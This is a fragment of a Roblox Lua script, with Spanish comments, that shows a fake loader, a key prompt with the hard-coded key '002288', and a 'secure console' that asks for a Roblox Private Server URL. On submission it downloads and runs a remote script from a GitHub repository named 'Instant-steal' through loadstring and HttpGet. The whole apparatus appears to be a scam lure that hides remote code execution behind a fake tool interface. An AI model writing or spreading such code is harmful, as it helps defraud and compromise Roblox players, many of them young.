        
        -- Cargar tu script
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/musica.lua"))()
        
    else
        status.Text = "Invalid link. Paste a Roblox Private Server URL or type /exit"
    end
end





    input.FocusLost:Connect(function(enter) if enter then submit() end end)
    UserInputService.InputBegan:Connect(function(k,gpe) if gpe then return end
      if k.KeyCode==Enum.KeyCode.Return and input:IsFocused() then submit() end
    end)
    submitBtn.MouseButton1Click:Connect(submit)
    input:CaptureFocus()
  end

  local function trySubmit()
    local key = box.Text or ""
    if key ~= "002288" then bigToast("Invalid key", "Please check the latest key."); return end
    bigToast("Key accepted", "Opening secure console…")
    task.delay(0.3, openCMD2)
  end

  bSub.MouseButton1Click:Connect(trySubmit)
  box.FocusLost:Connect(function(enter) if enter then trySubmit() end end)
end

-- ===== Orquestación: SIN lluvia hasta el LOGIN
showLoader(function()
  showCMD1(function()
    showLogin()
  end)
end)

